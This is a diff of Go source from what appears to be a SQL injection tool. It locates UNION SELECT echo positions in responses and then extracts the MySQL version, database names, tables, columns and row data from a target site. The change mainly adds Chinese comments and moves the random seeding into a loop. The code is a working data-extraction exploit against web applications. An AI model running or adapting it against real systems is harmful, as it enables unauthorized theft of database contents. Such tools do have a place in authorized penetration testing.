@@ -79,9 +79,13 @@ func GetUnionSelectPos(suffix string, url string, key int) Pos {
 	unionSql := bytes.Buffer{}
 	unionSql.WriteString(url + suffix + constant.Space +
 		constant.UnionSelectUnionSql + constant.Space)
-	rand.Seed(time.Now().UnixNano())
+	// 设置随机数（唯一ID）
+	// randMap是UnionSelect序号和随机数的对应关系
+	// 为了后续可以根据回显随机数确认需要并替换为Payload
 	randMap := make(map[int]int)
 	for i := 1; i < key; i++ {
+		// 每次根据当前时间生成，确保唯一
+		rand.Seed(time.Now().UnixNano())
 		x := rand.Intn(constant.DefaultRandomRange)
 		randMap[i] = x
 		unionSql.WriteString(strconv.Itoa(x) + ",")
@@ -97,16 +101,19 @@ func GetUnionSelectPos(suffix string, url string, key int) Pos {
 			if !strings.Contains(body, strconv.Itoa(v)) {
 				continue
 			}
+			// 保存随机数在页面中的索引
 			index := strings.Index(body, strconv.Itoa(v))
 			if index != -1 {
 				tempPos := Pos{}
 				tempPos.Key = k
 				tempPos.StartIndex = index
 				endIndex := index + len(strconv.Itoa(v))
+				// 得到随机数之后的第一个字符，为了后续的分割
 				tempPos.EndIndexChar = util.GetIndexChar(body, endIndex)
 				tempPosList = append(tempPosList, tempPos)
 			}
 		}
+		// 可能找到多处回显，确保最终返回的是第一处回显
 		min := GetMinPos(tempPosList)
 		return min
 	}
@@ -127,7 +134,9 @@ func GetVersion(pos Pos, suffix string, url string, key int) string {
 	code, _, tempBody := util.Request(constant.DefaultMethod, versionPayload, nil, nil)
 	if code != -1 {
 		body := string(tempBody)
+		// 获得随机数开始索引处往后的部分
 		innerRes := util.SubstringFrom(body, pos.StartIndex)
+		// 根据随机数之后的第一个字符分割得到数据
 		result := strings.Split(innerRes, pos.EndIndexChar)[0]
 		log.Info("MySQL Version:" + result)
 		return result
@@ -149,7 +158,9 @@ func GetCurrentDatabase(pos Pos, suffix string, url string, key int) string {
 	code, _, tempBody := util.Request(constant.DefaultMethod, databasePayload, nil, nil)
 	if code != -1 {
 		body := string(tempBody)
+		// 获得随机数开始索引处往后的部分
 		innerRes := util.SubstringFrom(body, pos.StartIndex)
+		// 根据随机数之后的第一个字符分割得到数据
 		result := strings.Split(innerRes, pos.EndIndexChar)[0]
 		log.Info("current database:" + result)
 		return result
@@ -172,7 +183,9 @@ func GetAllDatabases(pos Pos, suffix string, url string, key int) string {
 	code, _, tempBody := util.Request(constant.DefaultMethod, tablePayload, nil, nil)
 	if code != -1 {
 		body := string(tempBody)
+		// 获得随机数开始索引处往后的部分
 		innerRes := util.SubstringFrom(body, pos.StartIndex)
+		// 根据随机数之后的第一个字符分割得到数据
 		result := strings.Split(innerRes, pos.EndIndexChar)[0]
 		log.Info("get databases success")
 		util.PrintDatabases(util.ConvertString(result))
@@ -195,7 +208,9 @@ func GetAllTables(pos Pos, suffix string, url string, key int, database string) 
 	code, _, tempBody := util.Request(constant.DefaultMethod, tablePayload, nil, nil)
 	if code != -1 {
 		body := string(tempBody)
+		// 获得随机数开始索引处往后的部分
 		innerRes := util.SubstringFrom(body, pos.StartIndex)
+		// 根据随机数之后的第一个字符分割得到数据
 		result := strings.Split(innerRes, pos.EndIndexChar)[0]
 		log.Info("get tables success")
 		util.PrintTables(util.ConvertString(result))
@@ -220,7 +235,9 @@ func GetColumns(pos Pos, suffix string, url string, key int, database string, ta
 	code, _, tempBody := util.Request(constant.DefaultMethod, columnPayload, nil, nil)
 	if code != -1 {
 		body := string(tempBody)
+		// 获得随机数开始索引处往后的部分
 		innerRes := util.SubstringFrom(body, pos.StartIndex)
+		// 根据随机数之后的第一个字符分割得到数据
 		result := strings.Split(innerRes, pos.EndIndexChar)[0]
 		log.Info("get columns success")
 		util.PrintColumns(util.ConvertString(result))
@@ -240,6 +257,7 @@ func GetData(pos Pos, suffix string, url string, key int, database string, table
 		for _, v := range columns {
 			prefix = prefix + v + ",0x3a,"
 		}
+		// 去除字符串末尾六位，为了不在for循环内部再判断
 		innerR := []rune(prefix)
 		innerRes := string(innerR[:len(innerR)-6])
 		dataSql.WriteString(innerRes + "),")
@@ -250,9 +268,12 @@ func GetData(pos Pos, suffix string, url string, key int, database string, table
 	code, _, tempBody := util.Request(constant.DefaultMethod, columnPayload, nil, nil)
 	if code != -1 {
 		body := string(tempBody)
+		// 获得随机数开始索引处往后的部分
 		innerRes := util.SubstringFrom(body, pos.StartIndex)
+		// 根据随机数之后的第一个字符分割得到数据
 		result := strings.Split(innerRes, pos.EndIndexChar)[0]
 		log.Info("get data success")
+		// 字符串数组转接口数据后才能动态printf规范输出
 		var output [][]string
 		for _, v := range strings.Split(result, ",") {
 			var temp []string
